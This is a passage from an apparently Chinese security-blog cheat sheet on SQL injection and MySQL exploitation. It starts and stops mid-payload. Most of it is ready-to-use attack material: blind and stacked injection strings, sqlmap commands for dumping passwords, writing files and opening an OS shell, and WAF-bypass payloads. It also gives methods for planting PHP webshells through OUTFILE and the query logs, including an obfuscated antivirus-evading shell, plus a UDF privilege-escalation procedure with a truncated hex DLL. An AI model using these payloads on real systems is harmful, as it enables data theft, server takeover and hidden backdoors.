class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br><span class="hljs-attribute">1</span>&#x27; and if(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;s&#x27;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment">#用ascii码的好处：MYSQL不区分大小写&#x27;s&#x27;=&#x27;S&#x27;为真</span><br><span class="hljs-attribute">1</span>&#x27; and if(ord(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">114</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></table></figure><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> databases<span class="hljs-meta">#</span><br><span class="hljs-number">1</span>;<span class="hljs-keyword">show</span> databases<span class="hljs-meta">#</span><br><span class="hljs-number">1</span>;<span class="hljs-keyword">show</span> databases;<br><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> tables<span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> columns from words<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h3 id="改表、字段名"><a href="#改表、字段名" class="headerlink" title="改表、字段名"></a>改表、字段名</h3><p>有words表和1919810931114514表情况下</p><pre><code class="hljs"> 1. 将表words的名称改为其他的（如words1）， 2. 将1919810931114514改为words. 3. 将flag改为id, 4. 在输入栏中输入1&#39; or 1=1,将其中的数据全部输出，即为flag.</code></pre><p>  语句：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">rename</span> <span class="hljs-keyword">tables</span> words <span class="hljs-keyword">to</span> words1 ;<br><span class="hljs-keyword">rename</span> <span class="hljs-keyword">tables</span> <span class="hljs-number">1919810931114514</span> <span class="hljs-keyword">to</span> words ;<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words change flag id <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);#<br></code></pre></td></tr></table></figure><p>sqlmap使用</p><p>参考资料：<a href="https://blog.csdn.net/u011377996/article/details/81368482">https://blog.csdn.net/u011377996/article/details/81368482</a><br>sql注入的防御：<br><a href="https://blog.51cto.com/u_12332766/2137035">https://blog.51cto.com/u_12332766/2137035</a><br><a href="https://www.freebuf.com/vuls/265308.html">https://www.freebuf.com/vuls/265308.html</a></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">常用语句：<br>判断是否存在注入 sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1<br>读取日志的请求进行检测 sqlmap -l request.txt<br>查询当前的所有数据库 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--dbs</span><br>获取数据库下的表名 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security <span class="hljs-params">--tables</span><br>获取表中的字段名 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security -T users <span class="hljs-params">--columns</span><br>获取字段的内容 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security -T users -C username,password <span class="hljs-params">--dump</span><br>获取数据库的所有用户 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--users</span><br>获取数据库用户的密码 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--password</span><br>获取当前数据库的名称 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--current-db</span><br>获取当前数据库的用户 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--current-user</span><br>sqlmap获取数据库名、数据库表、数据库字段<br>sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--current-db</span><br>sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security <span class="hljs-params">--tables</span><br>sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security -T users <span class="hljs-params">--columns</span><br>获取指定表中的数据 sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security -T users <span class="hljs-params">--dump</span><br>获取所有表的数据 sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--dump-all</span><br>sqlmap读取系统文件 sqlmap -u http:<span class="hljs-string">//192.168.75.141/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--file-read=/etc/os-release</span><br>sqlmap写入系统文件 sqlmap -u http:<span class="hljs-string">//192.168.75.141/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--file-write=/root/test</span>.php <span class="hljs-params">--file-dest=/var/www/html/test</span>.php<br>sqlmap执行系统命令 sqlmap -u http:<span class="hljs-string">//192.168.75.141/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--os-shell</span><br><br>参数：<br><br><span class="hljs-params">--level</span> 探测等级：1-5，默认为1，等级越高，payload越多，速度越慢。HTTP cookei在level为2时就会测试，HTTP User-Agent/Referer在level为3时就会测试。<br><span class="hljs-params">--risk</span> 危险登录：1-3，默认为1，等级越高，越可能对数据库造成破坏<br><span class="hljs-params">--id-dba</span> 确认当前用户为管理权限（是否为root权限，mssql下最高权限为sa）<br><span class="hljs-params">--sql-shell</span> 运行自定义sql语句<br><span class="hljs-params">--os-cmd</span>,<span class="hljs-params">--os-shell</span> 运行任意操作系统命令<br><span class="hljs-params">--file-read</span> 从数据库服务器中读取文件<br><span class="hljs-params">--file-write</span> 上传文件到数据库服务器中<br><span class="hljs-params">--flush-session</span> 清空已保存的会话信息<br><span class="hljs-params">--dbs</span> 所有数据库<br><span class="hljs-params">--current-db</span> 网站当前数据库<br><span class="hljs-params">--users</span> 所有数据库用户<br><span class="hljs-params">--current-user</span> 当前数据库用户<br><span class="hljs-params">--random-agent</span> 构造随机user-agent<br><span class="hljs-params">--passwords</span> 数据库密码<br><span class="hljs-params">--proxy</span> http:<span class="hljs-string">//local</span><span class="hljs-function">:8080</span> –threads 10 <span class="hljs-params">(可以自定义线程加速)</span> 代理<br><span class="hljs-params">--time-sec=TIMESEC</span> DBMS响应的延迟时间（默认为5秒)<br><span class="hljs-params">--threads=</span> 使用多少线程<br></code></pre></td></tr></table></figure><h2 id="Bypass-waf"><a href="#Bypass-waf" class="headerlink" title="Bypass waf"></a>Bypass waf</h2><p>绕过and、or</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">if((<span class="hljs-number">1</span>=<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br><span class="hljs-string">||</span><br><span class="hljs-meta">&amp;&amp;</span><br></code></pre></td></tr></table></figure><p>绕过空格</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-number">0</span>a<br><span class="hljs-comment">/**/</span><br></code></pre></td></tr></table></figure><p>绕过order by</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>order<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span>by <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>绕过union select</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span><span class="hljs-regexp">/*!50441select*/</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br>unIon<br>selECt<br></code></pre></td></tr></table></figure><p>绕过database(),user()</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span><span class="hljs-regexp">/*!50441select*/</span> <span class="hljs-number">1</span>,database(<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span>*<span class="hljs-regexp">/),user(/</span>*<span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span>)<br></code></pre></td></tr></table></figure><p>获取表名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/*//////*/</span><span class="hljs-comment">/*!50441select*/</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>(<span class="hljs-comment">/*///*/</span>)<br></code></pre></td></tr></table></figure><p>获取列名</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span><span class="hljs-regexp">/*!50441select*/</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,group_concat(column_name) from information_schema.columns where%<span class="hljs-number">20</span>table_schema=database(<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span>*<span class="hljs-regexp">/) and/</span>*<span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span>table_name=<span class="hljs-string">&quot;admin&quot;</span><br></code></pre></td></tr></table></figure><p>获取数据</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/*//////*/</span><span class="hljs-comment">/*!50441select*/</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-keyword">password</span>),group_concat(username) <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span><br></code></pre></td></tr></table></figure><p>fuzz</p><h2 id="mysql写shell、提权"><a href="#mysql写shell、提权" class="headerlink" title="mysql写shell、提权"></a>mysql写shell、提权</h2><h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><p>一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，在 Windows 环境下成功率会很高。</p><h4 id="outfile和dumpfile"><a href="#outfile和dumpfile" class="headerlink" title="outfile和dumpfile"></a>outfile和dumpfile</h4><p>条件</p><ol><li><p>要知道网站绝对路径，可以通过报错，phpinfo界面，404界面等一些方式知道</p></li><li><p>gpc为off，on的话单引号被转义了，语句就不能正常执行了</p></li><li><p>要有file权限，默认情况下只有root有</p></li></ol><p><code>select user,file_priv from mysql.user;</code></p><ol start="4"><li><p>对目录要有写权限</p></li><li><p><code>secure_file_priv</code>的值非NULL或为导出的绝对路径</p></li></ol><p>​secure_file_priv的值在mysql配置文件my.ini中设置，这个参数用来限制数据导入导出<br>​Mysql&gt;&#x3D;5.5.53 默认为NULL，即默认禁止导入导出<br>​Mysql&lt;5.5.53 默认为空，即默认无限制</p><p>​<code>show global variables like &#39;%secure_file_priv%&#39;;</code></p><h4 id="union"><a href="#union" class="headerlink" title="union"></a>union</h4><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?id=1&#x27; union select 1,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;,3 into outfile &#x27;C:/shell.php&#x27;%23</span><br><span class="language-xml">?id=1&#x27; union select 1,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;,3 into dumpfile &#x27;C:/shell.php&#x27;%23</span><br><span class="language-xml"></span><br><span class="language-xml">hex</span><br><span class="language-xml">id=-1&#x27; union select 1,0x3c3f70687020706870696e666f28293b3f3e,3 into outfile &quot;C:/shell.php&quot;%23</span><br></code></pre></td></tr></table></figure><h4 id="非union"><a href="#非union" class="headerlink" title="非union"></a>非union</h4><p>使用<code>fields terminated by</code>与<code>lines terminated by</code>写shell</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; FIELDS TERMINATED BY &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;%23</span><br><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; FIELDS TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e %23</span><br><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; lines terminated by &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;%23</span><br><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e %23</span><br></code></pre></td></tr></table></figure><h4 id="outfile和dumpfile的区别"><a href="#outfile和dumpfile的区别" class="headerlink" title="outfile和dumpfile的区别"></a>outfile和dumpfile的区别</h4><p><strong>outfile</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">支持多行数据同时导出<br>使用<span class="hljs-built_in">union</span>联合查询时，要保证两侧查询的列数相同<br>会在换行符制表符后面追加反斜杠<br>会在末尾追加换行(所以不能直接写入二进制文件)<br></code></pre></td></tr></table></figure><p><strong>dumpfile</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">每次只能导出一行数据<br>不会在换行符制表符后面追加反斜杠<br>不会在末尾追加换行<br>如果服务器端本身的查询语句，结果有多行，但是我们又想使用<span class="hljs-keyword">dump</span> <span class="hljs-keyword">file</span>，应该手动添加 limit 限制<br></code></pre></td></tr></table></figure><h3 id="日志写shell-general-log"><a href="#日志写shell-general-log" class="headerlink" title="日志写shell(general_log)"></a>日志写shell(general_log)</h3><p><code>secure_file_priv</code><br> Mysql&gt;&#x3D;5.5.53 默认为NULL，即默认禁止导入导出<br> Mysql&lt;5.5.53 默认为空，即默认无限制</p><p>在5.5.53版本后无法用sql语句修改<code>secure_file_priv</code> ，利用日志将shell写入日志中</p><p>条件</p><ol><li><p>对目录要有写权限</p></li><li><p>高权限运行 MySQL 或者 Apache</p></li></ol><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)</span><br><span class="language-xml">show variables like &#x27;%general%&#x27;;</span><br><span class="language-xml">开启日志监测，默认关闭(如果一直开文件会很大的)</span><br><span class="language-xml">set global general_log = on;</span><br><span class="language-xml">设置日志路径</span><br><span class="language-xml">set global general_log_file = &#x27;/var/www/html/info.php&#x27;;</span><br><span class="language-xml">执行查询，写入shell</span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;;</span><br><span class="language-xml">结束后，恢复日志路径，关闭日志监测</span><br><span class="language-xml">set global general_log = off;</span><br><span class="language-xml"></span><br><span class="language-xml">SQL查询免杀shell</span><br><span class="language-xml">select &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$sl</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>, @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-variable">$sl</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;</span><br><span class="language-xml"></span><br><span class="language-xml">SELECT &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;f&#x27;</span>=&gt;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;pffff&#x27;</span>=&gt;<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>=&gt;<span class="hljs-string">&#x27;fffff&#x27;</span>,<span class="hljs-string">&#x27;lfaaaa&#x27;</span>=&gt;<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;nnnnn&#x27;</span>=&gt;<span class="hljs-string">&#x27;t&#x27;</span>);<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">array_keys</span>(<span class="hljs-variable">$p</span>);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;pffff&#x27;</span>].<span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;pffff&#x27;</span>].<span class="hljs-variable">$a</span>[<span class="hljs-number">2</span>];<span class="hljs-variable">$_</span>= <span class="hljs-string">&#x27;a&#x27;</span>.<span class="hljs-variable">$_</span>.<span class="hljs-string">&#x27;rt&#x27;</span>;<span class="hljs-variable">$_</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]));<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;</span><br></code></pre></td></tr></table></figure><h3 id="慢查询getshell-slow-query-log"><a href="#慢查询getshell-slow-query-log" class="headerlink" title="慢查询getshell(slow_query_log)"></a>慢查询getshell(slow_query_log)</h3><p>如果是普通日志，开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错</p><p>使用慢查询日志时，只有当查询时间超过系统时间时才会记录在日志中</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">查看慢查询信息是否开启<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%slow_query_log%&#x27;</span>;<br>启用慢查询日志(默认禁用)<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> slow_query_log<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br>修改日志文件路径<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> slow_query_log_file<span class="hljs-operator">=</span><span class="hljs-string">&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;</span>;<br>查看写入慢日志的时间要求<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%long_query_time%&#x27;</span>        <br>执行查询，写入shell<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[abc]);?&gt;&#x27;</span> <span class="hljs-keyword">or</span> sleep(<span class="hljs-number">11</span>);<br></code></pre></td></tr></table></figure><h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><p><code>user defined function</code>，用户自定义函数，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 version () 等方便。</p><p>udf在<code>mysql&gt;=5.1</code>的版本中，存在于<code>mysql/lib/plugin</code>目录下，文件后缀为.dll，常用c语言编写。</p><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查看secure_file_priv<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br>查看插件目录<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%plugin%&#x27;</span>;<br>如果没有，手工创建（mysql5<span class="hljs-number">.1</span>以后基本不可能成功）<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;D:\\env\\php\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin::$index_allocation&#x27;</span>;<br>上传dll后，创建自定义函数<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">&#x27;lib_mysqludf_sys_64.dll&#x27;</span>;<br>导入成功后查看一下mysql函数里面是否新增了sys_eval函数：<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;sys_eval&#x27;</span>;<br>执行命令<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>删除函数<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_eval;<br></code></pre></td></tr></table></figure><p>这里注意如果有webshell可以直接上传dll或so文件就直接上传即可</p><p>如果有注入，但是无webshell，可以利用sqlmap，因为 GET 有<strong>字节长度限制</strong>，所以往往 POST 注入才可以执行这种攻击</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">sqlmap -u  <span class="hljs-string">&quot;http://localhost:3306/&quot;</span> --data<span class="hljs-operator">=</span><span class="hljs-string">&quot;id=1&quot;</span> --file-write<span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib_mysqludf_sys_64.so&quot;</span>  --file-dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span>  <br></code></pre></td></tr></table></figure><p>如果没有注入，但可以操作原生sql语句，例如进入phpmyadmin中</p><p>利用16进制into dumpfile写入，具体payload查询：<a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">直接 SELECT 查询十六进制写入<br>SELECT 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a24000000000000004d477bd0092615830926158309261583005e86830b261583005e808308261583005e968307261583005e91830b2615832ee06e830a2615830926148325261583005e9c8308261583005e878308261583005e8483082615835269636809261583000000000000000000000000000000000000000000000000504500004c0103004afe9f5a0000000000000000e00002210b010900001000000010000000600000607c0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007c83000008020000b4820000c800000000800000b402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002c7e00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000e0555058310000000000100000007000000010000000040000000000000000000000000000400000e02e7273726300000000100000008000000006000000140000000000000000000000000000400000ce393100555058210d090208b92bcf11b11ceea24f550000560c000000220000260000a8ffffffff8b4c240833c03901741656578b7c24146a0c59be000010dcf3a566a55fb0015e5dfb77fbc38b44240c1a6a071611108bf8183218ff63db6f1ca45fc7011e1200210883380175128b40040df6776f0700750a1004c6000132c0c3530abf1df68d3c3053a454082d08ff30ff15fff6ee776c885985c075085614c601011bc8568d71018a11fd6fdffe4184d275f98b54142bce890a32558bec8b4d0c833902b7d860bf5374148b7d10915c5453eb4cbf9dbddf8b417d740f1b707c1bebe5836004dbb1ffb7001a0c8b48048b008d4401025072a0594c08dfc8d7b5891678113006a44ceb6c57beb7b2b85f5e5da30421740833dbb63ff6a8591353568b742410d878534602db85db5bb6460851c78d5c4257e8240b75eeeebfe01400c604070008ff70041e0553b1db1b921a22c418535720030054090f09b7086a995b0f98599954cf2d343713b8f4540b1edeb60d818403552251519d35dffed6fedf576800f762d66a018945fc068bf08b4560dd7ff70cc606004533ff595939387471683cc071c6fedfda9c12260c3bc7745b506a04ff75fc149073e1edd7a9fd48533afc8d48911040b963dbff2bc18bd88d043b505630f8268c5330d8ad8dbd5f03fe570e940de57df8463fe6364c2066ba5b1810a4803e0059169eb0ff741a8bc6c64437ff00594d1489c906987bebd86f183e5f205ec9c3eed7b235dcbaf37d574708c45030087bdbdacdc9c26a4078c710548d4601b9e07e614251724f0856ff31cf6bafdd9db694c66aff8dc32082f63a58b0b6030d092c23005f7cc36e57036c6a081d1290ac0aa88365fc2f6c2f2c2d4592d0eb071b408f65e8c70bbfd66e42feff000d1fedc25e3bffdb17b60d08209a02f3c3e90806f58bff56688000002d8c6d675880985608845aa3bde0febb062358045485f675054daa83260076fbb7db4508c36f08ed09acc704240607ff0b4c113637598d71ffcf9c0bbf77dfc9750e39056b107e3cff7310830b01fbeec6bb8b0910548b098f57890a23480f85d47d618cbbad641718068b79040838071b76edeebb1e50eb184aa705b8e61768b0b030d8e803a83c0957c1d6bbaeb5d6a1e7e9e2573ca12f4c6a6ff777c3025efd096a1fee76eb3caa10c80475ed7befc0c7051f281a70e027071bdff79d5cb520bc04b81b6a5635b952eb782b7339b2e3696ff7defd7340393d155c741c68062809ac43db6b85850d9e1034252316ffe666f862f154b201dc0801592cc2b1a1db78049ddfdbf62413d90fd4fc83f80266b16f6cb0d2595bffa0584b77783bb5783106350f8487c71996ee4cd3543bf81810897d82efc796be35fac87251833f8af36a7c398587b4f10774e9ffc8d60f7c89c5db9bb5d955f85615441b474ded5be38ef88a394d1003d00874b48909437aa36d020c1ad3f8eba71c3162cc5a64442e386161fb0a58064c32fc19503f1bdf720443375bc9c20cc710fb02231fb2288b2ef28b5d081cae0fdb9b54e433c95cfc7d2008016c2dc6c23bf15a393a4417e4d61bfe7fafae3bf0740583fe02752e1910d03bc1e7166e